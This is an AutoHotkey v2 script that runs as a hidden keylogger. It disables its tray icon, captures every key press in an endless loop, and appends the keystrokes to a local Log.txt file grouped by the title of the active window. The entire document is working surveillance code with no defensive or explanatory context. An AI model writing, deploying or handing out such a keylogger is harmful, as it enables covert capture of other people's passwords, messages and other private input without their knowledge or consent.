#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon

LogFile := A_ScriptDir "\Log.txt"
LastWin := ""

; Create log file if it doesn't exist
if !FileExist(LogFile)
    FileAppend "", LogFile

Loop {
    ; Get active window title
    try CurrentWin := WinGetTitle("A")
    catch
        CurrentWin := "N/A"
    
    ; Capture single key press
    IH := InputHook("L1 V")
    IH.Start()
    IH.Wait()
    Key := IH.Input
    
    ; Skip empty keys (like modifier-only presses)
    if Key = ""
        continue
    
    ; Log based on window change
    if (CurrentWin == LastWin) {
        FileAppend Key, LogFile
    } else {
        FileAppend "`n" CurrentWin "|" Key "|", LogFile
        LastWin := CurrentWin
    }
}